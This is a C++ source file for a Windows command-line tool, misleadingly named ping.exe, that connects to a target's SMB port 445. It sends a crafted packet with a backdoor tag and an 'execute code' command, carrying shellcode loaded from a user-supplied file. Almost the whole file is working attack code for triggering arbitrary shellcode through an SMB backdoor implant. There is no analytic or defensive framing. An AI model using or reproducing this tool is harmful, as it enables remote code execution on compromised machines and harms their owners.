#include <stdio.h>
#include <stdint.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <TlHelp32.h>
#pragma comment(lib, "ws2_32.lib")


#include "packet.h"
#include <vector>
#include <string>
#include <fstream>


std::vector<char> byte_read(char const* filename)
{
	std::ifstream ifs(filename, std::ios::binary | std::ios::ate);
	std::ifstream::pos_type pos = ifs.tellg();
	std::vector<char>  result(pos);
	ifs.seekg(0, std::ios::beg);
	ifs.read(&result[0], pos);
	return result;
}

int main(int argc, char* argv[]) {
	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA wsaData = { 0 };
	SOCKET sock = INVALID_SOCKET;
	WSAStartup(wVersionRequested, &wsaData);

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in client;
	client.sin_family = AF_INET;
	client.sin_port = htons(445);
	
	if (argc < 6) {
		printf("\nping.exe -h <host_ip> -c <cmd> -p <payload>\nExample: ping.exe -h 127.0.0.1 -c exec -p D:\\shellcode.bin");
		return 0;
	}
	else if (!strcmp(argv[4], "exec") && argv[6]!=NULL)
	{
		InetPtonA(AF_INET, argv[2], &client.sin_addr);
		connect(sock, (sockaddr*)&client, sizeof(client));

		REPULSAR_EXECUTE exec;

		exec.NetBios = 0x0;
		exec.SmbHeader[0] = 'u';
		exec.SmbHeader[1] = 'P';
		exec.SmbHeader[2] = 'e';
		exec.SmbHeader[3] = 'R';
		exec.BackdoorCommand = 0x2B;	//0x2b execute code

		exec.NetBiosLength = htons((sizeof(REPULSAR_EXECUTE) - 0x4)); //4Bytes netbios struct

		std::vector<char> USERMODE_SHELLCODE;
		USERMODE_SHELLCODE = byte_read(argv[6]);
		exec.ShellcodeLength = USERMODE_SHELLCODE.size();


		memset(exec.shellcode, 0, USERMODE_SHELLCODE.size()); //1Byte 0-terminated array
		memcpy(exec.shellcode, USERMODE_SHELLCODE.data(), USERMODE_SHELLCODE.size());

		printf("SHELLCODE SIZE 0x%x\n", exec.ShellcodeLength);
		printf("Sending SMB packet wit tag 0x%x and command 0x%X...\n", *(PULONG)exec.SmbHeader, exec.BackdoorCommand);
		printf("Your shellcode will be executed!\n");
		send(sock, (const char*)&exec, sizeof(REPULSAR_EXECUTE), 0);

		printf("--------Done!\n");
	}
	
	return 0;
}